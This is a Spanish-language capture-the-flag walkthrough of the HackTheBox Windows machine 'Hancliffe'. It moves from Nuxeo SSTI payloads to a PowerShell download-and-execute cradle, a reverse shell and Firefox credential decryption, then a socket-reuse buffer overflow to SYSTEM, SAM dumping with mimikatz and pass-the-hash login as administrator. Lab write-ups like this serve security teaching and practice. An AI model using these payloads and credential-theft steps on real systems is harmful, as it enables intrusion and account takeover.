# Máquina "Hancliffe" de HackTheBox

## Características

- Windows  
- Difícil  
- Buffer overflow 
- Abusing URI Normalization
- Server Side Template Injection (SSTI) [NUXEO Vulnerability]
- Unified Remote 3 Exploitation (RCE)
- Decrypt Mozilla protected passwords
- Reversing EXE in Ghidra
- Buffer Overflow (Socket Reuse Technique) [AVANZADO]

## Útil en

- Buffer Overflow 
- OSED 
- OSCP (Intrusión) 
- eWPT 
- eWPTXv2 
- OSWE

**IP:** 10.10.11.115

## Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.115
```

**Resultado:**

```
PORT     STATE SERVICE VERSION

80/tcp   open  http    nginx 1.21.0
|_http-server-header: nginx/1.21.0
|_http-title: Welcome to nginx!

8000/tcp open  http    nginx 1.21.0
|_http-server-header: nginx/1.21.0
|_http-title: HashPass | Open Source Stateless Password Manager

9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe: 
|     Welcome Brankas Application.
|     Username: Password:
|   NULL: 
|     Welcome Brankas Application.
|_    Username:
```

Al lanzar `nc` a la IP con el puerto 9999 devuelve el siguiente mensaje:

```bash
nc 10.10.11.115 9999
Welcome Brankas Application.
```

## Reconocimiento Web

Visitamos la web de la página con el puerto 8000:

![Web  ](/secciones/posts/imagenes/hancliffe/web1.png)

Podemos ver una web que genera contraseñas rellenando tres campos y en el puerto 80 podemos ver un servicio nginx:

![Página de mantenimiento](/secciones/posts/imagenes/hancliffe/maintenance1.png)

## Fuzzing de Directorios

Comenzaremos fuzzeando:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://10.10.11.115/nuxeo/FUZZ"
```

Entre los directorios encontramos `/maintenance` que redirecciona a `/nuxeo/Maintenance/`, también está con `/` al final `/maintenance/`. Por lo que sabemos, podemos suponer que nginx actúa como un proxy inverso y, dado que Nuxeo está basado en Java.

Luego intentamos con:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://hancliffe.htb/maintenance/FUZZ"
```

**Salida:**

```
/index.jsp            (Status: 200) [Size: 714]
/.xhtml               (Status: 401) [Size: 221]
/.                    (Status: 200) [Size: 714]
/.jsf                 (Status: 200) [Size: 117]
/.seam                (Status: 401) [Size: 221]
/.faces               (Status: 401) [Size: 221]
```

Revisamos cada uno y en la sección `/.jsf`:

![Error JSF](/secciones/posts/imagenes/hancliffe/mainenace2.png)

Vemos un mensaje de error "Faceles not found /maintenance/xhtml". Conociendo que es nginx y Java, buscamos en Google y vemos dos cosas interesantes: una vulnerabilidad para el software de Nuxeo y un post donde habla de los ataques relacionados con:
https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/

Luego de revisar el post seguiremos con:

```bash
ffuf -u 'http://hancliffe.htb/maintenance/..;/FUZZ' -w /home/asdf/github/SecLists/Discovery/Web-Content/raft-small-files.txt -mc 200
```

Que nos devuelve:

```
home.html               [Status: 200, Size: 2600, Words: 606, Lines: 120]
login.jsp               [Status: 200, Size: 8874, Words: 1322, Lines: 451]
```

Vemos el home y el login, en el cual el login en la sección del footer podemos ver:

**Copyright © 2001-2022 Nuxeo and respective authors. Nuxeo Platform FT 10.2**

Por lo tanto confirmamos que es vulnerable a CVE-2018-16341 ya que es una versión inferior a la 10.3.

**CVE-2018-16341:** Ejecución remota de código de Nuxeo sin autenticación mediante inyección de plantilla del lado del servidor
https://github.com/mpgn/CVE-2018-16341

Seguimos testeando con wfuzz:

```bash
sudo wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://10.10.11.115/nuxeo/FUZZ"
```

Mientras en Google buscamos el concepto "abusing uri normalization":

[Breaking Parser Logic - Black Hat 2018](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)

**Nginx off-by-slash:**
- Mostrado por primera vez a finales de 2016 HCTF - crédito a @iaklis
- Un buen vector de ataque pero muy poca gente lo sabe.

## Explotación SSTI

Continuaremos descargando el exploit de GitHub.

Hay una inyección de plantilla del lado del servidor en la aplicación Java, lo que significa que si puedo incluir una cadena como `${-7+7}` en algún lugar donde se analizará como código, entonces puedo ejecutar Java y, por lo tanto, ejecutar el código de forma remota.

Para probar esto, el repositorio sugiere visitar la URL:

```
http://127.0.0.1:8080/nuxeo/login.jsp/pwn${-7+7}.xhtml
```

![Error SSTI](/secciones/posts/imagenes/hancliffe/error1.webp)

Es funcional, así que modificamos el exploit que descargamos y en PayloadsAllTheThings vamos a la sección de Java:

```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
```

Modificamos para que haga ping a nuestra máquina:

```java
${T(java.lang.Runtime).getRuntime().exec('ping 10.10.14.18')}
```

Llegamos a la sección Expression Language EL - Code Execution y aquí rescatamos el código:

**Método usando Reflection & Invoke:**

```java
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec('ping 10.10.14.18')}
```

Luego URL encodeamos y ahora sí nos detecta las trazas. Listo, tenemos capacidad de ejecución remota de comandos, así que entraremos con una PowerShell.

## Reverse Shell

Descargamos:

```
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

Hacemos wget al raw del mismo y rescatamos:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
```

Modificamos IP y puerto por los que queramos, entonces en Burp capturamos, enviamos al forward, decodificamos lo encodeado anteriormente con `Ctrl + Shift + U` y dentro de la sección exec ponemos:

```powershell
powershell -enc 
```

Codificamos en base64 y lanzamos:

```bash
echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.18/ps.ps1')" | iconv -t utf-16le | base64 -w 0; echo
```

Descarga y ejecuta el archivo ps1, tenemos una reverse shell. Buscamos la flag de user.

Una vez dentro verificamos permisos, vamos a desktop, hacemos `ls` y vemos un link simbólico (`.lnk`) y un archivo `server.bat`. Mientras seguimos revisando, en paralelo descargaremos winPEAS hacia la víctima, y podemos ver que Clara tiene archivos de configuración relacionados a Firefox.

```
use post/multi/gather/firefox_creds
```

Utilizamos Firepwd para descifrar y obtener una contraseña relacionada con el desarrollo:

**lclevy/firepwd:** firepwd.py, una herramienta de código abierto para descifrar contraseñas protegidas de Mozilla
https://github.com/lclevy/firepwd

Las credenciales que obtuvimos:

```
decrypting login/password pairs http://localhost:8000:b'hancliffe.htb',b'#@H@ncLiff3D3velopm3ntM@st3rK3y*!'
```

![Generador de contraseñas](/secciones/posts/imagenes/hancliffe/gen1.jpg)

Utilizaremos la información recolectada para ir a la página en el puerto 8000 que recordemos es una página generadora de passwords y pondremos la información recuperada:

- **Site:** development
- **Username:** hancliffe.htb
- **Master Key:** #@H@ncLiff3D3velopm3ntM@st3rK3y*!

Para que nos dé la contraseña:

```
AMl.q2DHp?2.C/V0kNFU
```

## Acceso como Development

Usamos esto con evil-winrm:

```bash
sudo evil-winrm -i 127.0.0.1 -u 'development' -p 'AMl.q2DHp?2.C/V0kNFU'
```

Y estamos dentro.

Al ver la información relacionada con el usuario, podemos tener en cuenta el desarrollo remoto, por lo que el puerto WinRM también se reenvía y la contraseña generada se utiliza para iniciar sesión correctamente:

```powershell
net user development
```

Y vemos que tiene acceso a remote management. Así que si tunelizamos con chisel el 5985 junto a evil-winrm tendremos acceso a development.

Ahora para ver los puertos abiertos de salida:

Con esto vamos a tener una forma más cómoda de visualizar:

```powershell
Get-NetTCPConnection -State Listen | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}} | FT -Property LocalAddress,LocalPort,ProcessName
```

Ahora vamos a analizar los puertos 9512 y 9510 que son de RemoteServerWin.

**RemoteServerWin.exe** es un archivo exe ejecutable que pertenece al proceso Unified Remote, desarrollado por Unified Intents AB. El proceso RemoteServerWin.exe en Windows 10 es importante, se debe tener cuidado al trabajar con él. RemoteServerWin.exe puede estar usando demasiado la CPU o la GPU. Si se trata de malware o virus, es posible que se esté ejecutando en segundo plano.

Usamos las credenciales generadas anteriormente, primero reenviando el puerto y luego con evil-winrm:

```bash
portfwd add –l 5985 –p 5985 –r 127.0.0.1
```

```bash
sudo evil-winrm -i 127.0.0.1 -u 'development' -p 'AMl.q2DHp?2.C/V0kNFU'
```

![Evil-WinRM](/secciones/posts/imagenes/hancliffe/evilrm1.jpg)

Y estamos dentro, somos hancliffe\development. Recorremos directorios y vamos a `devapp.exe`, lo descargamos a nuestro directorio con el descargador de archivos por defecto de evil-winrm: `download ruta`. Luego desde el atacante hacemos:

```bash
strings myfirstapp.exe
```

Y vemos una salida muy larga, así que procederemos a hacer reversing con Ghidra.

## Análisis con Ghidra

Así que entramos a la parte del BOF. Lo analizamos con Ghidra y OllyDbg y encontramos varios datos interesantes.

![Análisis Ghidra 1](/secciones/posts/imagenes/hancliffe/gid1.png)

Encontramos los datos de acceso de usuario a la aplicación:

- **Username:** "alfiansyah" 
- **Password:** "YXlYeDtsbD98eDtsWms5SyU="
- **Fullname:** "Vickry Alfiansyah"
- **Invitecode:** "T3D83CbJkl1299"

![Cifrado 1](/secciones/posts/imagenes/hancliffe/cifrar1.png)

![Cifrado 2](/secciones/posts/imagenes/hancliffe/cifrar2.png)

Así que trataremos de realizar el método inverso y conseguir descifrar la password. En conclusión se descubrió que la contraseña está en base64 y luego es encriptada en ROT47, la cual llevaremos a CyberChef para hacerle el reversing:

https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)ROT47(47)&input=WVhsWWVEdHNiRDk4ZUR0c1dtczVTeVU9

Así que el resultado final es el siguiente:

```
K3r4j@@nM4j@pAh!T
```

Podemos ver en el segundo encriptador que lleva a los valores tras este cifrado, es llamado Atbash, también se le llama método espejo ya que consiste en cambiar la primera letra por la última, la segunda por la penúltima y así.

Las credenciales son correctas pero nos pide dos campos más que no hemos encontrado: full name y code.

## Buffer Overflow - Socket Reuse

A continuación tenemos que encontrar la forma de conseguir explotar la aplicación y vemos un posible punto a través del código de invitado, aunque parece que no disponemos del tamaño suficiente para nuestro payload, así que después de un rato buscando encontramos que es vulnerable al ataque de Reutilización de Socket y vemos dos posts bastante interesantes donde comentan y explican cómo hacer este tipo de desbordamientos:

- https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/
- https://infosecwriteups.com/expdev-vulnserver-part-6-8c98fcdc9131

Así que generamos nuestro exploit y lanzamos:

```python
python2 exploit-socket-reuse.py
Welcome Brankas Application.
Username: 
Password: 
Login Successfully!
FullName: 
Input Your Code: 
```

Y después de varios intentos en nuestra shell atacante recibimos:

```bash
nc -lvp 5555
listening on [any] 5555 ...
connect to [10.10.14.13] from hancliffe.htb [10.10.11.115] 64843
whoami
nt authority\system
```

## Extracción de Hashes

Una vez dentro buscamos la SAM:

```cmd
reg save hklm\sam c:\sam
reg save hklm\system c:\system
```

Y la desciframos con mimikatz:

```bash
wine64 mimikatz.exe
```

```
log hash.txt
lsadump::sam /system:/home/asdf/current/keys/system /sam:/home/asdf/current/keys/sam
```

Y así dispondremos ya del hash de administrator.

## Acceso como Administrator

Como ya hemos conseguido también el hash del usuario administrator, accedemos con el mismo y buscamos nuestra flag:

```bash
evil-winrm.rb -i 127.0.0.1 -u administrator -H XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

```
Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
hancliffe\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/11/2021   5:40 PM           1575 AutoRestart.lnk
-ar---         1/17/2022   7:21 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
exxxxxxxxxxxxxxxxxxxxxxxxxxxxxe
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```

Y terminada.

---

**Nota:** Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes, esto debido a que en algunas de las máquinas que realicé, no tomé los apuntes o no tomé capturas de pantalla, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. También si encuentras faltas de ortografía o cualquier error, puedes contactarme a mi correo.